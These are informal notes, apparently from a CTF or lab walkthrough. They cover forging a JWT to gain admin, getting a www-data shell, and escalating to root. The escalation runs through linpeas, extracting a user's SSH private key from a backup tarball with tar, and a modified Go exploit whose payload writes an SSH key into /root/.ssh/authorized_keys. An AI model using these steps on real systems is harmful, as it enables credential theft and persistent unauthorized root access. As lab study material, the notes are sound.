==jwt== required a ==rsa== key ..so i created one with openssl and only filled the private part key of the token

==openssl== genrsa -out priv.key 2048

then also change the other parameter which pointed to admin and logged in as admin

where i put a shell and got in as www-data

#1 we run ==linpeas== it said it is vul to some cve and we got directly root

#2 we see the /var/backup file and saw home.tar.gz

we can still only read them with tar flags

==tar== -tvf home.tar.gz                  to ==list== them all

tar xf home.tar.gz ==-O== home/noah/.ssh/id_rsa                  to ==read== a specific file

then we got in as noah

we checked docker version and found a go script

sudo docker exec -it webapp-dev01 bash

we got in as root in docker then

go build the script we found changing the payload a bit

adding out ==authorized_keys== in root

we dwlded it on docker root and loged in as root

the part we changed

```
var payload = "#!/bin/bash \n mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing' > /root/.ssh/authorized_keys" 
```
